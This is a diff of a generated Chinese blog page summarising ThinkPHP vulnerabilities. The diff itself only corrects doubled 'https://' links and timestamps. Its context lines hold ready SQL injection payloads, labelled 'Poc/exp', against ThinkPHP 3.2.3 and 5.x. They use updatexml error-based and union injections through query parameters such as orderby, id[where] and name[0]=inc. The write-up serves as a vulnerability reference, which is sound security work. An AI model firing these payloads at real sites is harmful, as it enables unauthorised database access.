@@ -3,10 +3,10 @@
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>[框架漏洞]Thinkphp系列漏洞【截至2020-07-20】 | Gridea</title>
-<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1624178139382">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="[框架漏洞]Thinkphp系列漏洞【截至2020-07-20】 | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[框架漏洞]Thinkphp系列漏洞【截至2020-07-20】 | Gridea - Atom Feed" href="https://jinqipiaopiao.github.io//atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -22,8 +22,8 @@ ThinkPHP是一个快速，兼容而且简单的轻量级国产php开发框架，
     <div class="main">
       <div class="main-content">
         <div class="site-header">
-  <a href="https://https://jinqipiaopiao.github.io/">
-  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  <a href="https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://jinqipiaopiao.github.io//images/avatar.png?v=1624178139382" alt="">
   </a>
   <h1 class="site-title">
     Gridea
@@ -183,7 +183,7 @@ Sdump($m);
 <p>5.1.22</p>
 <pre><code>?orderby[id` | updatexml(1,concat(0x3a,user()),1)%23]=1
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621341613571.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1621341613571.png" alt="" loading="lazy"><br>
 <strong>6.Thinkphp3.2.3 find/select/delete注入</strong><br>
 影响版本<br>
 Thinkphp&lt;=3.2.3</p>
@@ -212,7 +212,7 @@ where:</p>
 <p>table:</p>
 <pre><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1621341996112.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1621341996112.png" alt="" loading="lazy"></figure>
 <p>而delete()方法的话同样，这里粗略举三个例子，table,alias,where，但使用table和alias的时候，同时还必须保证where不为空</p>
 <p>where:</p>
 <pre><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐
@@ -223,7 +223,7 @@ where:</p>
 <p>table:</p>
 <pre><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat x7e,user(),0x7e),1)‐‐&amp;id[where]=1
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621342140772.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1621342140772.png" alt="" loading="lazy"><br>
 <strong>7.ThinkPHP框架3.2.3 update注入漏洞</strong><br>
 影响版本<br>
 Thinkphp&lt;=3.2.3<br>
@@ -250,7 +250,7 @@ var_dump($valu);
 <p>Poc/exp:</p>
 <pre><code>/index.php/home/user?name=1123&amp;pass=liao&amp;id[0]=bind&amp;id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621342300362.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1621342300362.png" alt="" loading="lazy"><br>
 <strong>8.ThinkPHP 5.1.7 update注入</strong><br>
 漏洞介绍<br>
 本次漏洞存在于 Mysql 类的 parseArrayData 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。<br>
@@ -275,7 +275,7 @@ db('user')-&gt;where(['id'=&gt;1]-&gt;update(['pass'=&gt;&amp;password]));
 <p>Poc/exp:</p>
 <pre><code>/index.php?pass[0]=inc&amp;pass[1]=updatexml(2,concat(0x7e,user()),0)&amp;pass[2]=1
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621342477495.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1621342477495.png" alt="" loading="lazy"><br>
 <strong>9.ThinkPHP 5.0.15 insert注入</strong><br>
 漏洞介绍<br>
 本次漏洞存在于 Builder 类的 parseData 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。<br>
@@ -301,7 +301,7 @@ return 'Update success';
 <p>Poc/exp:</p>
 <pre><code>/index/index/index?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;name[2]=1
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621342609146.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1621342609146.png" alt="" loading="lazy"><br>
 <strong>10.ThinkPHP5 select注入</strong><br>
 漏洞介绍<br>
 本次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。<br>
@@ -327,7 +327,7 @@ return 'select success';
 <p>Poc/exp:</p>
 <pre><code>/index/index/index?name=) union select updatexml(1,concat(0x7,user(),0x7e),1)#
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621343073743.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1621343073743.png" alt="" loading="lazy"><br>
 <strong>11.ThinkPHP5.0.10 select注入</strong><br>
 漏洞介绍<br>
 本次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句。再一个， Request 类的 filterValue 方法漏过滤 NOT LIKE 关键字，最终导致 SQL注入漏洞 的产生。<br>
@@ -353,7 +353,7 @@ var_dump($result);
 <p>Poc/exp:</p>
 <pre><code>/index/index/index?name[0]=not like&amp;name[1][0]=%%&amp;name[1][1]=233&amp;name[2]=) union select 1,user()#
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621343114766.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1621343114766.png" alt="" loading="lazy"><br>
 <strong>12.ThinkPHP Mysql 聚合函数相关方法注入</strong><br>
 漏洞介绍<br>
 本次漏洞存在于所有 Mysql 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。<br>
@@ -429,7 +429,7 @@ Poc/exp:</p>
         
           <div class="next-post">
             <div class="next">下一篇</div>
-            <a href="https://https://jinqipiaopiao.github.io/post/gong-fang-shi-jie-web-gao-shou-qu/">
+            <a href="https://jinqipiaopiao.github.io/post/gong-fang-shi-jie-web-gao-shou-qu/">
               <h3 class="post-title">
                 攻防世界（Web高手区）
               </h3>
@@ -441,7 +441,7 @@ Poc/exp:</p>
 
         <div class="site-footer">
   Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
-  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+  <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
